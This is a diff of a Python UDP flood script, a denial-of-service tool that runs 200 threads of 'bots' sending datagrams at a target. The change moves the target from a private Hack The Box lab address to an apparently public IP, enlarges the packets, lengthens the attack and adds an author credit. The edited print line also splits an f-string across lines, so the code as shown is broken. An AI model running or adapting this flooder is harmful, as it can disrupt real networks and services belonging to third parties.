@@ -3,11 +3,11 @@ import threading
 import random
 import time
 
-target_ip = "10.10.10.10"  # replace with the HTB target IP
+target_ip = "24.51.68.50"  # replace with the HTB target IP
 target_port = 80           # replace with the appropriate port
-packet_size = 1024         # bytes per packet
+packet_size = 9999         # bytes per packet
 threads = 200              # number of "bots"
-duration = 60              # duration in seconds
+duration = 200              # duration in seconds
 
 def flood():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -19,11 +19,12 @@ def flood():
         except:
             pass
 
-print(f"[+] Starting flood to {target_ip}:{target_port} with {threads} threads.")
+print(f"[+] Starting flood to {target_ip}:{target_port} with {threads} threads.
+Made by Khalil")
 for i in range(threads):
     t = threading.Thread(target=flood)
     t.daemon = True
     t.start()
 
 time.sleep(duration)
-print("[+] Attack finished.")
+print("[+] Attack finished!")
